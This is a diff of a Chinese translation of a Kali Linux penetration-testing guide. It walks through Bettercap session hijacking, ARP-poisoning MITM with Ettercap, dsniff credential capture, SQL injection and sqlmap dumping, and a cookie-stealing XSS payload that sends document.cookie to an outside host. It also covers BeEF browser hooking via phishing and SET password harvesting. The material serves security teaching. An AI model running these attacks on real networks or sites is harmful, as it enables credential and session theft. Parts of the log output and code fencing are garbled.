+Bettercap 是一种用于 HTTP 会话劫持（也称为 Sidejacking）窃取 cookie 的实用工具。它监听网络，捕获看到的 cookie 并将其导入浏览器环境，以便攻击者可以重放会话。有很多支持 Wireshark 捕获并简化数据的有用工具。例如可以从 `www.bettercap.com` 免费下载 Bettercap。
 
-## 第 5 章
+#### Bettercap 2.0 Sidejacking
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_208_0.png)
 
-### Bettercap 2.0 Sidejacking
-
 要劫持会话请遵循以下步骤：
+
 - 第一，点击适配器菜单并开始嗅探。
 - 第二，等待几秒钟确保收到数据包。
 - 第三，直到出现目标，点击“clone”。
 - 第五，从浏览器中清除 cookie 以确保与克隆目标无冲突。
 - 提示：偶尔刷新此页面查看更新，并确保清除浏览器中的所有 cookie。
 
+```
 状态
 代理：未知
 适配器：无
 数据包：0
 目标：0
+```
 
-尚未设置目标。流量必须通过 Bettercap 才能工作。你可以通过点击适配器链接来选择使用哪种适配器。例如，我将嗅探 eth0。要进行监控，输入适配器名称并点击提交按钮。此适配器必须支持“混杂”模式。你可能需要在命令行上配置适配器。
+尚未设置目标。流量必须通过 Bettercap 才能工作。你可以通过点击适配器链接来选择使用哪种适配器。例如，我将嗅探 `eth0`。要进行监控，输入适配器名称并点击提交按钮。此适配器必须支持“混杂”模式。你可能需要在命令行上配置适配器。
 
 Bettercap 将你重定向到 Sidejacking 活动页面。你会注意到你正在接收数据包。Bettercap 需要一个嗅探器来获取流量。你可以访问 Sniffing/Spoofing 并选择 Bettercap 来使用它。会弹出一个带有选项的终端窗口。使用 `bettercap -i INTERFACE` 选择要用 Bettercap 嗅探的接口。Bettercap 会告诉你是否捕获了流量并在挂起状态下提示你。如你在 Bettercap 中看到的文本所示：
 
-```
-root@local ferret eth0
-FERRET 3.8.1 - 2007-2012 (c) Error Security
--- build = Mar 27 2013 13:51:59 (32-bit)
-libcapso: libcapso: cannot open shared object file: No such file or directory
-Searching elsewhere for libcap
-Found libcap
-  libcap version 1.3.0
-  1 eth0 (No description available)
-  2 nflog (Linux netfilter log (NFLOG) interface)
-  any (在所有接口上捕获的伪设备)
-  4 lo (No description available)
-SNIFFING: eth0
-LINKTYPE: 1 Ethernet
-```
 
 
- 中间人攻击
+`root@local ferret eth0`
+
+`FERRET 3.8.1 - 2007-2012 (c) Error Security`
+
+`-- build = Mar 27 2013 13:51:59 (32-bit)`
+
+`libcapso: libcapso: cannot open shared object file: No such file or directory`
+
+`Searching elsewhere for libcap`
+
+`Found libcap`
+
+`libcap version 1.3.0`
+
+`1 eth0 (No description available)`
+
+`2 nflog (Linux netfilter log (NFLOG) interface)`
+
+`any (在所有接口上捕获的伪设备)`
+
+`4 lo (No description available)`
+
+`SNIFFING: eth0`
+
+`LINKTYPE: 1 Ethernet`
+
+```
+```
+
+# 中间人攻击
 
 中间人攻击是一种主动监听的形式，攻击者与受害者建立连接并在受害者之间中继消息，使他们认为自己正在互相交谈。这种攻击有许多形式，例如使用 Hak5 Pineapple 路由器伪装成受信任的无线接入点，而实际上充当中间人。
 
@@ -3711,11 +3727,7 @@ LINKTYPE: 1 Ethernet
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_209_1.png)
 
-
-
-
-
-# 攻击身份验证
+## 攻击身份验证
 
 终端 1:
 
@@ -3747,9 +3759,11 @@ echo 1>/proc/sys/net/ipv4/ip_forward
 
 ```
 Version: 2.4
+
 Usage: dnsiff [-cdmn] [-i interface | -p pcapfile [-s snaplen]
       [-f services] [-t trigger(,...)] [-r|-w savefile]
 [expression]
+
 root@kali:-#
 ```
 
@@ -3757,16 +3771,21 @@ root@kali:-#
 
 ```
 root@kali:~# dnsiff -i eth0
+
 dnsiff: listening on eth0
 ```
 
-`dnsiff` 会捕获任何登录信息。例如，如果受害者通过 FTP 登录系统，一旦会话关闭，你就会看到登录尝试和凭据，dnsiff 需要看到整个会话。
+`dnsiff` 会捕获任何登录信息。例如，如果受害者通过 FTP 登录系统，一旦会话关闭，你就会看到登录尝试和凭据，`dnsiff` 需要看到整个会话。
 
 ```
 5/25/13 02:15:18 tcp 172.16.76.128.44837 -> 192.168.76.2 (ftp)
+
 USER admin
+
 PASS password123
 ```
+
+
 
 ### Ettercap
 
@@ -3774,11 +3793,11 @@ Ettercap 是一个用于中间人攻击的免费开源综合套件。
 
 Ettercap 可用于计算机网络协议分析和安全审计，特点是嗅探活动连接、内容过滤，并支持对多种协议进行主动和被动解析。Ettercap 的工作原理是将攻击者的网络接口设置为混杂模式，并对受害者机器进行 ARP 毒。
 
-要启动 Ettercap，导航到 Sniffing/Spoofing | Network Sniffers 并选择 Ettercap graphical。
+要启动 Ettercap，导航到 `Sniffing/Spoofing | Network Sniffers` 并选择 `Ettercap graphical`。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_213_0.png)
 
-第一步是选择你计划嗅探的接口。导航到 Sniff 标签页，选择嗅探类型（统一嗅探或桥接嗅探）以及你计划嗅探的接口。
+第一步是选择你计划嗅探的接口。导航到 `Sniff` 标签页，选择嗅探类型（统一嗅探或桥接嗅探）以及你计划嗅探的接口。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_213_1.png)
 
@@ -3790,60 +3809,54 @@ Ettercap 可用于计算机网络协议分析和安全审计，特点是嗅探�
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_214_0.png)
 
-让我们扫描网络中的可用主机。导航到 Hosts 并选择 Scan for hosts。Ettercap 将快速扫描整个 C 类网并列出所有识别出的主机。通常路由器是找到的第一个主机。截图显示了扫描期间发现的四个设备。
+让我们扫描网络中的可用主机。导航到 `Hosts` 并选择 `Scan for hosts`。Ettercap 将快速扫描整个 C 类网并列出所有识别出的主机。通常路由器是找到的第一个主机。截图显示了扫描期间发现的四个设备。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_214_1.png)
 
-在本示例中，我们发现了四个设备。我们可以假设 .1 是路由器，目标将是受害者机器 .128。让我们将路由器选为 Target 1，将受害者 .128 为 Target 2。这将我们的系统置于受害者和路由器之间，进行经典的中间人攻击。选择每个目标并点击相应的复选框。你可以通过导航到 Targets 并选择 Current Targets 来验证目标。
+在本示例中，我们发现了四个设备。我们可以假设 `.1` 是路由器，目标将是受害者机器 `.128`。让我们将路由器选为 `Target 1`，将受害者 `.128` 为 `Target 2`。这将我们的系统置于受害者和路由器之间，进行经典的中间人攻击。选择每个目标并点击相应的复选框。你可以通过导航到 `Targets` 并选择 `Current Targets` 来验证目标。
 
 - 3 个主机已添加到主机列表...
 - 正在对随机的 255 个主机进行扫描...
 - 正在扫描整个网络中的 255 个主机...
 - 4 个主机已添加到主机列表...
-- 主机 172.16.76.1 已添加到 TARGET1
-- 主机 172.16.76.128 已添加到 TARGET2
-
-（注：原文后续大量重复段落已去重）
-
-
-
-
+- 主机 `172.16.76.1` 已添加到 `TARGET1`
+- 主机 `172.16.76.128` 已添加到 `TARGET2`
 
 # 第 5 章
 
-在本示例中，我们将尝试对 DrChaos.com 网站进行 SQL 注入。让我们在 Kali 服务器控制台上，使用 Firefox 访问 www.DrChaos.com 并尝试登录该网站。首先，我们将尝试使用用户名 `administrator` 和密码 `12345` 登录。你应该发现登录失败了。
+在本示例中，我们将尝试对 `DrChaos.com` 网站进行 SQL 注入。让我们在 Kali 服务器控制台上，使用 Firefox 访问 `www.DrChaos.com` 并尝试登录该网站。首先，我们将尝试使用用户名 `administrator` 和密码 `12345` 登录。你应该发现登录失败了。
 
-现在，导航到 Firefox 中的 View（视图）菜单并选择 HackBack 菜单。点击 Load URL 按钮并点击 Enable Post data 按钮。你将看到我们正在登录的 URL 以及刚刚输入的用户名和密码。
+现在，导航到 Firefox 中的 `View`（视图）菜单并选择 `HackBack` 菜单。点击 `Load URL` 按钮并点击 `Enable Post data` 按钮。你将看到我们正在登录的 URL 以及刚刚输入的用户名和密码。
 
 ## 攻击身份验证
 
-我们现在将在 `administrator` 用户名后添加一个单引号。一旦点击 **Execute**（执行）按钮，我们就收到了 SQL 注入。这可能意味着服务器容易受到 SQL 注入攻击，因为服务器对 SQL 错误做出响应。
+我们现在将在 `administrator` 用户名后添加一个单引号。一旦点击 **`Execute`**（执行）按钮，我们就收到了 SQL 注入。这可能意味着服务器容易受到 SQL 注入攻击，因为服务器对 SQL 错误做出响应。
 
 我们将通过在行尾添加 `OR 1=1` 语句来实现 SQL 注入。
 
-一旦执行该代码，我们就以管理员的身份登录了 www.drchaos.com。
+一旦执行该代码，我们就以管理员的身份登录了 `www.drchaos.com`。
 
-我们已经修复了 www.DrChaos.com，使其不再容易受到此类攻击。然而，你可以看到 SQL 注入对于攻击来说非常有价值，因为它们为 Web 渗透测试提供了获取系统完全访问权限的方法。
+我们已经修复了 `www.DrChaos.com`，使其不再容易受到此类攻击。然而，你可以看到 SQL 注入对于攻击来说非常有价值，因为它们为 Web 渗透测试提供了获取系统完全访问权限的方法。
 
-SQL 注入的成功取决于攻击者对 SQL 命令的了解。如果你需要温习 SQL 技能，我们建议查看 W3 School 的 SQL 部分：http://www.w3schools.com/sql/sql_intro.asp。
+SQL 注入的成功取决于攻击者对 SQL 命令的了解。如果你需要温习 SQL 技能，我们建议查看 W3 School 的 SQL 部分：`http://www.w3schools.com/sql/sql_intro.asp`。
 
 ### sqlmap
 
-sqlmap 自动化了检测和利用 SQL 注入漏洞以及接管数据库服务器的过程。sqlmap 包含一个检测引擎，以及广泛的渗透测试功能，从数据库指纹到访问底层文件系统，以及通过带外连接在操作系统上执行命令。
+`sqlmap` 自动化了检测和利用 SQL 注入漏洞以及接管数据库服务器的过程。`sqlmap` 包含一个检测引擎，以及广泛的渗透测试功能，从数据库指纹到访问底层文件系统，以及通过带外连接在操作系统上执行命令。
 
-功能包括支持常见的数据库管理系统、支持许多 SQL 注入技术、枚举用户、密码哈希值等许多项，sqlmap 还支持使用 Metploit 的 Meterpreter getsystem 命令进行数据库进程的用户特权提升。
+功能包括支持常见的数据库管理系统、支持许多 SQL 注入技术、枚举用户、密码哈希值等许多项，`sqlmap` 还支持使用 `Metploit` 的 `Meterpreter getsystem` 命令进行数据库进程的用户特权提升。
 
-sqlmap 是一个可以用于利用数据库服务器的工具，并内置在 Kali 中。要使用 sqlmap，你需要将工具指向 Web 服务器上 SQL 脚本的 URL。这些脚本可以被识别，因为它们的 URL 中通常包含 `php`。
+`sqlmap` 是一个可以用于利用数据库服务器的工具，并内置在 Kali 中。要使用 `sqlmap`，你需要将工具指向 Web 服务器上 SQL 脚本的 URL。这些脚本可以被识别，因为它们的 URL 中通常包含 `php`。
 
-你可以在 Vulnerability Analysis（漏洞分析） | Database Assessment（数据库评估） | sqlmap 下找到 sqlmap。将打开一个终端窗口，显示 sqlmap 的帮助页面。
+你可以在 `Vulnerability Analysis`（漏洞分析） | `Database Assessment`（数据库评估） | `sqlmap` 下找到 `sqlmap`。将打开一个终端窗口，显示 `sqlmap` 的帮助页面。
 
-使用 sqlmap 的基本语法：
+使用 `sqlmap` 的基本语法：
 
 ```
 sqlmap -u URL --function
 ```
 
-一个常用的函数是 `dbs`。`dbs` 关键字会让 sqlmap 获取数据库。`sqlmap -u http://www.drchaos.com/article.php?id=5 --dbs`
+一个常用的函数是 `dbs`。`dbs` 关键字会让 `sqlmap` 获取数据库。`sqlmap -u http://www.drchaos.com/article.php?id=5 --dbs`
 
 从我们的结果中可以看到我们发现了几个数据库。在本示例中，我们将专注于 `test` 数据库。
 
@@ -3857,7 +3870,7 @@ sqlmap -u http://www.drchaos.com/article.php?id=5 -D test --tables
 
 `tables` 关键字用于检索我们服务器上 `test` 数据库中的所有表。我们看到成功检索了两个表：`admin` 和 `content`。
 
-一旦我们发布以下命令，sqlmap 将显示所有表：
+一旦我们发布以下命令，`sqlmap` 将显示所有表：
 
 ```
 sqlmap -u http://www.drchaos.com/article.php?id=5 -D test --tables
@@ -3892,10 +3905,6 @@ sqlmap -u http://www.drchaos.com/article.php?id=5 -T tablesname -U test --dump
 
 跨站脚本 (XSS) 是 Web 应用程序的一种漏洞。XSS 允许攻击者向网站注入脚本。这些脚本可以用于操纵 Web 服务器或连接到 Web 服务器的客户端。
 
-
-
-
-
 # 第5章
 
 通常情况下，为 Kali Linux 分配公网 IP 地址是非常糟糕的做法。执行这一步骤可能意味着打开防火墙并将 Kali Linux 暴露在远程攻击者面前。
@@ -3904,7 +3913,7 @@ sqlmap -u http://www.drchaos.com/article.php?id=5 -T tablesname -U test --dump
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_224_0.png)
 
-对于这次练习，我们创建了两个独立的账户。让我们用第一个账户登录。在示例中，我们的第一个账户名为 TheDude。接下来，我们进入 snippet（代码段）部分并创建一个新的 snippet。我们将如截图所示输入一个 XSS 脚本：
+对于这次练习，我们创建了两个独立的账户。让我们用第一个账户登录。在示例中，我们的第一个账户名为 `TheDude`。接下来，我们进入 `snippet`（代码段）部分并创建一个新的 `snippet`。我们将如截图所示输入一个 XSS 脚本：
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_224_1.png)
 
@@ -3915,10 +3924,11 @@ sqlmap -u http://www.drchaos.com/article.php?id=5 -T tablesname -U test --dump
 Facebook 无法通过这种攻击被利用。这只是一个假设性的例子。
 
 我们输入了以下代码：
+```
 
-```
+
+
 <script>document.write("<img src='http://kali.drchaos.com/var/www/xss_lab/lab_script.php?document.cookie='"></"></script>
-```
 
 > 虽然在输入命令时文字可能会换行，但它需要是一条单行命令。
 
@@ -3930,38 +3940,43 @@ Facebook 无法通过这种攻击被利用。这只是一个假设性的例子�
 
 ### urlsnarf
 
-urlsnarf 是一个工具，它可以从 HTTP 流量中嗅探所有请求的 URL，并公共日志格式（CLF，几乎所有 Web 服务器都使用）输出，适用于使用你喜爱的 Web日志分析工具（analog、wwstat 等）进行离线后处理。
+`urlsnarf` 是一个工具，它可以从 HTTP 流量中嗅探所有请求的 URL，并公共日志格式（CLF，几乎所有 Web 服务器都使用）输出，适用于使用你喜爱的 Web日志分析工具（analog、wwstat 等）进行离线后处理。
 
-要访问 urlsnarf，导航到 Sniffing/Spoofing | Network Sniffers 并选择 urlsnarf。一个终端（Terminal）将会弹出并显示如下截图所示的选项：
+要访问 `urlsnarf`，导航到 Sniffing/Spoofing | Network Sniffers 并选择 `urlsnarf`。一个终端（Terminal）将会弹出并显示如下截图所示的选项：
 
 ```
 root@kali:~ ~
+
 File Edit View Search Terminal Help
+
 Version: 2.4
+
 Usage: urlsnarf [-n] [-i interface | -p pcapfile] [-v] pattern [expression]
+
 root@kali:~# 
 ```
 
-要使用 urlsnarf，输入 `urlsnarf -i` 以及你想要监控的接口。urlsnarf 将显示其正在监听。以下截图显示 urlsnarf 列出了 eth0：
+要使用 `urlsnarf`，输入 `urlsnarf -i` 以及你想要监控的接口。`urlsnarf` 将显示其正在监听。以下截图显示 `urlsnarf` 列出了 `eth0`：
 
 ```
 Usage: urlsnarf [-n] [-i interface -p pcapfile] [-v] pattern [expression]
+
 root@kali:~# urlsnarf -i eth0
+
 urlsnarf: listening on eth0 [tcp port 80 or port 8080 or port 3128]
 ```
 
-urlsnarf 将显示你所寻找的任何 URL 请求的转储。例如，显示的用户访问了 www.thesecurityblogger.com。URL 请求将显示在 urlsnarf 中供以后使用。
+`urlsnarf` 将显示你所寻找的任何 URL 请求的转储。例如，显示的用户访问了 www.thesecurityblogger.com。URL 请求将显示在 `urlsnarf` 中供以后使用。
 
 ```
 172.16.76.128 - [13/May/2013:10:12:38 -0400] GET /download.windowsupdate-com/v9/1/windowsupdate/supdate/W03SU3/06/other/wus3setup.cab7136080333
+
 HTTP/1.1 " - "Windows-Update"
+
 172.16.76.128 - [13/May/2013:10:12:50 -0400] GET://www.thesecurityblog-like Gecko Chrome/27.0.1453.94 Safari/537.36 (Windows NT 5.1) AppleWebKit/537.36 (KHTMLHT-172.16.76.128 - [13/May/2013:10:12:52 -0400] GET://www.thesecurityblog-wp-content/plugins/gd-star-rating/gss.php?id=55b82541e650d5b5f2=20b60c5521622e024392162222440/gss.php?id=33lcypical23lcypical23lipnark23lsyscapertialictizing23tsigstrating/gt23listthesecurityforoffter&ver=9.22 HTTP/1.1 "http://www.thesecurityblogger.com/Mozilla/5.0
+
 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36
 ```
-
-
-
-
 
 ## Web 攻击
 
@@ -3973,14 +3988,14 @@ BeEF 未包含在 Kali Linux 的 1.0 版本中，但可以在 beefproject.com �
 
 要安装 BeEF，请在 Kali Linux 上以 root 用户身份打开终端并执行以下命令：
 
-- apt-get update
-- apt-get install beef-xss
+- `apt-get update`
+- `apt-get install beef-xss`
 
 ```
 root@kali:~# apt-get update
 ```
 
-当运行 apt-get update 命令时，你可能会被要求安装、更新或覆盖某些旧文件。在大多数情况下，你只需要接受默认提示。当更新过程完成后，你可以使用 apt-get 安装 BeEF：
+当运行 `apt-get update` 命令时，你可能会被要求安装、更新或覆盖某些旧文件。在大多数情况下，你只需要接受默认提示。当更新过程完成后，你可以使用 `apt-get` 安装 BeEF：
 
 ```
 root@kali:~# apt-get install beef-xss
@@ -3992,31 +4007,53 @@ root@kali:~# apt-get install beef-xss
 
 ```
 root@kali:/usr/share/beef-xss
+
 File View Search Help
+
 root@kali:/usr/share/beef-xss # beef
+
 /usr/share/beef-xss# ./beef
+
 [1:32:02] * Bind socket [impawaloral] listening on [0.0.0.0:2000]
+
 [1:32:02] * Browser Exploitation Framework (BeEF) 0.4.5-alpha
+
 [1:32:02] * Site: http://beefproject.com
+
 [1:32:02] * Blog: http://blog.beefproject.com
+
 [1:32:02] * Wiki: https://github.com/beefproject/wiki
+
 [1:32:02] * Project Creator: made byicorn (WadeAllison)
+
 [1:32:02] * BeEF loading: Wait a few seconds...
+
 [1:32:02] * 10 extensions enabled
+
 [1:32:02] * 171 modules enabled
+
 [1:32:02] * 2 network interfaces detected: 127.0.0.1
+
 [1:32:02] running on network interface: 172.16.66.144
+
 [1:32:02] _ UI URL: http://127.0.0.1:3000/ui/panel
+
 [1:32:02] _ UI URL: http://172.16.66.144:3000/ui/panel
+
 [1:32:02] _ Hook URL: http://172.16.66.144:3000/hook
+
 [1:32:02] * RESTful API key: af2c6da1b8e7440ad5a4bd8008a348d8c44
+
 [1:32:02] * HTTP Proxy: http://172.16.66.144:8080/proxy
+
 [1:32:02] * BeEF server started (press ctrl+c to stop)
 ```
 
+
+
 要访问管理服务器，请打开浏览器并转到 `/ui/panel` URL。在骗受害者被 BeEF 挂钩时，将受害者重定向到列为 `hook.js` 的 BeEF 服务器挂钩 URL。你需要制定一种策略让受害者访问你的挂钩 URL，例如钓鱼攻击或社会工程攻击，这些攻击会将用户重定向到 BeEF。
 
-在示例中，我们将访问：http://172.16.86.144:3000/ui/panel。默认用户名和密码均为 beef。
+在示例中，我们将访问：`http://172.16.86.144:3000/ui/panel`。默认用户名和密码均为 `beef`。
 
 当受害者点击或被重定向到“hook.js”网站时，BeEF 服务器上的攻击者会将新系统添加到目标列表中，并在挂钩的受害者在线时显示它们。离线受害者无论在重新使用互联网之前是否访问过挂钩链接，当他们连接互联网时都会受到攻击。下一张截图显示了 BeEF 的主仪表板以及针对挂钩受害者的启动选项：
 
@@ -4033,7 +4070,7 @@ root@kali:/usr/share/beef-xss # beef
 
 ### FoxyProxy – Firefox 插件
 
-如果你计划使用 Zed Attack Proxy (ZAP) 或 BURP 等代理，你可能希望使用 Firefox 插件 FoxyProxy 来简化。FoxyProxy 是一个 Firefox 扩展，可以让你轻松管理、更改或禁用代理设置。安装 FoxyProxy 后，Firefox 顶部会出现一个图标。点击它可以打开 FoxyProxy：
+如果你计划使用 Zed Attack Proxy `ZAP` 或 `BURP` 等代理，你可能希望使用 Firefox 插件 FoxyProxy 来简化。FoxyProxy 是一个 Firefox 扩展，可以让你轻松管理、更改或禁用代理设置。安装 FoxyProxy 后，Firefox 顶部会出现一个图标。点击它可以打开 FoxyProxy：
 
 要在 FoxyProxy 中添加代理：
 
@@ -4046,15 +4083,11 @@ root@kali:/usr/share/beef-xss # beef
 
 ### BURP Proxy
 
-BurP Proxy 是一个拦截 HTTP 和 HTTPS 流量的工具。它允许渗透人员检查应用程序、漏洞以及客户端与 Web 服务器之间的双向流量。BurP Proxy 非常流行，因为它不仅可以检查流量，还可以操纵请求。我们将研究如何使用 BurP Proxy 操控、响应和窃取身份。
+BurP Proxy 是一个拦截 HTTP 和 HTTPS 流量的工具。它允许渗透人员检查应用程序、漏洞以及客户端与 Web 服务器之间的双向流量。BurP Proxy 非常流行，因为它不仅可以检查流量，还可以操纵请求。我们将研究如何使用 Burp Proxy 操控、响应和窃取身份。
 
-需要记住，BurP Proxy 实际上是 Burp Suite 的一部分，后者是一个工具集。当用户在网络浏览器中输入如 http://www.dattack.com 的 URL 时，他们期望重定向到该网站。代理服务器会拦截该请求并代表客户端发送。代理服务器通常用于检查流量并保护客户端免受有害数据。作为渗透人员，你可以使用代理服务器拦截客户端流量、复制请求或操纵它：
+需要记住，BurP Proxy 实际上是 Burp Suite 的一部分，后者是一个工具集。当用户在网络浏览器中输入如 `http://www.dattack.com` 的 URL 时，他们期望重定向到该网站。代理服务器会拦截该请求并代表客户端发送。代理服务器通常用于检查流量并保护客户端免受有害数据。作为渗透人员，你可以使用代理服务器拦截客户端流量、复制请求或操纵它：
 
-要启动 Burp Suite，只需导航到：Kali | Sniffing/Spoofing | Web Sniffers 并选择 Burp Suite。
-
-
-
-
+要启动 Burp Suite，只需导航到：`Kali | Sniffing/Spoofing | Web Sniffers` 并选择 Burp Suite。
 
 ### 启动 Burp Suite 后，你将看到 Burp 启动面板：
 
@@ -4064,7 +4097,7 @@ BurP Proxy 是一个拦截 HTTP 和 HTTPS 流量的工具。它允许渗透人�
 
 > Intercept 按钮需要手动干预，否则请求将永远到达 Web 服务器。
 
-下一个配置设置可以在 Options（选项）子菜单中找到。此部分允许用户在 Burp 运行时检查或更改默认端口。默认情况下，Burp 设置为在回环接口（loopback interface）上运行，如后续截图所示。回环接口是一种特殊的接口，关联了 IP 地址 127.0.0.1。它没有绑定到物理硬件连接，而是操作系统引用自身的一种方式。换句话说，当你想在网络中与自己进行通信时，可以使用回环接口。如果你计划在本地机器之外测试 Burp Suite，你应该添加你的以太网接口和 IP 地址。
+下一个配置设置可以在 Options（选项）子菜单中找到。此部分允许用户在 Burp 运行时检查或更改默认端口。默认情况下，Burp 设置为在回环接口（loopback interface）上运行，如后续截图所示。回环接口是一种特殊的接口，关联了 IP 地址 `127.0.0.1`。它没有绑定到物理硬件连接，而是操作系统引用自身的一种方式。换句话说，当你想在网络中与自己进行通信时，可以使用回环接口。如果你计划在本地机器之外测试 Burp Suite，你应该添加你的以太网接口和 IP 地址。
 
 ## Web 攻击
 
@@ -4076,7 +4109,7 @@ BurP Proxy 是一个拦截 HTTP 和 HTTPS 流量的工具。它允许渗透人�
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_237_1.png)
 
-对于接下来的示例，我们将在 Firefox 中访问一个 URL，例如 DrChaos.com。你会发现什么都没有发生。这是因为正如我们之前讨论的，Intercept 功能默认是启用的。你现在可以看到 Burp 中的 Intercept 标签颜色发生了变化，表示拦截了一个新请求。
+对于接下来的示例，我们将在 Firefox 中访问一个 URL，例如 `DrChaos.com`。你会发现什么都没有发生。这是因为正如我们之前讨论的，Intercept 功能默认是启用的。你现在可以看到 Burp 中的 Intercept 标签颜色发生了变化，表示拦截了一个新请求。
 
 ## 第 6 章
 
@@ -4119,6 +4152,7 @@ Burp 将你所有的请求都映射在 Target（目标）下。点击 Target 标
 | https://www.stubcoupon.com | GET | /http-drchaos-...... | | 137 | | | |
 | https://www.facebook.com | GET | /http-drchaos-...... | | 137 | | | |
 | https://www.w3.org | GET | /http-drchaos-...... | | 137 | | | |
+
 要使用 **Spider**，右键点击一个目标主机：
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_239_0.png)
@@ -4194,11 +4228,7 @@ Burp 中的 Spider 允许 Web 渗透人员查看 Web 应用程序或网站是如
 
 ZAP 是一种易于使用的集成渗透工具，用于发现 Web 应用程序中的漏洞。我们简要概述了如何使用 **ZAP** 扫描目标可能的漏洞。让我们重新回顾 ZAP 如何识别和利用跨站脚本（通常称为 XSS）。
 
-ZAP 内置于 Kali Linux 1.0 中，可以在 **Sniffing/Spoofing/ Web Sniffers** - **ZAP** 下找到它，或者简单地打开终端窗口并输入 ZAP，如下：
-
-
-
-
+ZAP 内置于 Kali Linux 1.0 中，可以在 **Sniffing/Spoofing/ Web Sniffers** - **ZAP** 下找到它，或者简单地打开终端窗口并输入 `ZAP`。
 
 ## Web 攻击
 
@@ -4210,7 +4240,7 @@ ZAP 内置于 Kali Linux 1.0 中，可以在 **Sniffing/Spoofing/ Web Sniffers**
 4. 点击“查看证书 (View Certificates)”并导入证书。
 5. 勾选使用新证书的所有信任选项。
 6. 设置您的 浏览器使用 ZAP 作为默认代理。在 Firefox 中，可以在“首选项 | 高级 | 网络 (Network)”下找到。
-7. 输入代理服务器 localhost 和端口号 8080（这是 ZAP 代理的默认端口）。
+7. 输入代理服务器 `localhost` 和端口号 `8080`（这是 ZAP 代理的默认端口）。
 8. 勾选“所有协议使用代理服务器”。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_243_0.png)
@@ -4242,7 +4272,7 @@ Google 创建 Gruyere 项目是作为测试应用程序漏洞和防御的手段�
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_244_0.png)
 
-创建你自己的 Gruyere 实例来测试 ZAP。你将获得一个唯一的 URL。我们获得的 URL 是 http://google-gruyere.appspot.com/326352883334/。
+创建你自己的 Gruyere 实例来测试 ZAP。你将获得一个唯一的 URL。我们获得的 URL 是 `http://google-gruyere.appspot.com/326352883334/`。
 
 我们将回到 ZAP 对此 URL 进行快速扫描：
 
@@ -4250,13 +4280,13 @@ Google 创建 Gruyere 项目是作为测试应用程序漏洞和防御的手段�
 
 ## Web 攻击
 
-截图示例显示了一组 SEED 文件，其中一个的标签很有意思：http://google-gruyere.appspot.com/326352883334/invalid。
+截图示例显示了一组 SEED 文件，其中一个的标签很有意思：`http://google-gruyere.appspot.com/326352883334/invalid`。
 
 当我们将此放入浏览器时，会得到以下错误消息：
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_245_0.png)
 
-在涉及 XSS，URL 中最危险的字符是 < 和 >。如果黑客能够让应用程序直接使用 < 和 > 在页面中插入他们想要的内容，就会为注入恶意脚本打开大门。这里是其他一些 SEED 文件：
+在涉及 XSS，URL 中最危险的字符是 `<` 和 `>`。如果黑客能够让应用程序直接使用 `<` 和 `>` 在页面中插入他们想要的内容，就会为注入恶意脚本打开大门。这里是其他一些 SEED 文件：
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_245_1.png)
 
@@ -4264,12 +4294,17 @@ Google 创建 Gruyere 项目是作为测试应用程序漏洞和防御的手段�
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_245_3.png)
 
-这是一个通过注入脚本来利用这些 SEED 链接之一的示例。我们将创建一个 URL 并添加 alert (1) 脚本，看看网站是否会创建一个弹出错误：
-
+这是一个通过注入脚本来利用这些 SEED 链接之一的示例。我们将创建一个 URL 并添加 `alert(1)` 脚本，看看网站是否会创建一个弹出错误：
 ```
+
+
+
 http://google-gruyere.appspot.com/326352883334/
+
 <script>alert(1);</script>
+
 </script>
+
 ```
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_246_0.png)
@@ -4282,18 +4317,19 @@ http://google-gruyere.appspot.com/326352883334/
 
 ### SET 密码收割
 
-我们在第 4 章中检查了社会工程工具包 (SET) 的基础。我们将回顾 SET 并查看密码收集和获取特权信息的高级概念。
+我们在第 4 章中检查了社会工程工具包 `SET` 的基础。我们将回顾 `SET` 并查看密码收集和获取特权信息的高级概念。
 
-作为复习，我们将通过进入 Exploitation Tools (利用工具) | Social Engineering Tools (社会工程工具) | se-toolkit 来启动 SET。
+作为复习，我们将通过进入 `Exploitation Tools` | `Social Engineering Tools` | `se-toolkit` 来启动 `SET`。
 
-第一次使用，请确保 SET 已更新。更新 SET 以及验证 GIT 是否安装的步骤可以在第 4 章找到。
+第一次使用，请确保 `SET` 已更新。更新 `SET` 以及验证 `GIT` 是否安装的步骤可以在第 4 章找到。
 
-> 当 SET 克隆一个网站时，它会运行一个 Web 服务器。目标对象能够连接到你的 Web 服务器非常重要。这意味着任何基于 Internet 的攻击都需要利用 IP 地址（通过 NAT 或直接在 Kali Linux 上），并开放防火墙规则以允许从远程访问 Kali。
+> 当 `SET` 克隆一个网站时，它会运行一个 Web 服务器。目标对象能够连接到你的 Web 服务器非常重要。这意味着任何基于 Internet 的攻击都需要利用 IP 地址（通过 NAT 或直接在 Kali Linux 上），并开放防火墙规则以允许从远程访问 Kali。
 
-一旦你处理了任何 IP 配置，就可以启动 SET 了：
+一旦你处理了任何 IP 配置，就可以启动 `SET` 了：
 
 ```
 root@kali:/usr/share# cp backup.set/config/set_config/set/config
+
 root@kali:/usr/share# se-toolkit
 
 重要通知！由于 Kali 的目录结构，社会工程工具包进行了一些重大更改。
@@ -4301,19 +4337,23 @@ root@kali:/usr/share# se-toolkit
 所有 SET 动态信息现在将保存在 ~/.set 中，而不是 src/project_Jun。
 
 [!] 请注意以后你应该使用 se-toolkit。
+
 [!] 通过 'se-toolkit' 启动即将失效...
+
 [!] 如果不在 Kali 上，运行 python setup.py install 然后你可以在任何地方使用 se-toolkit。
 
 按 (return) 键继续 SET。
 ```
 
-我们将使用 SET 来收割密码。SET 有能力克隆你想要的网站。在示例中，我们实际上选择了流行的网站之一进行克隆。
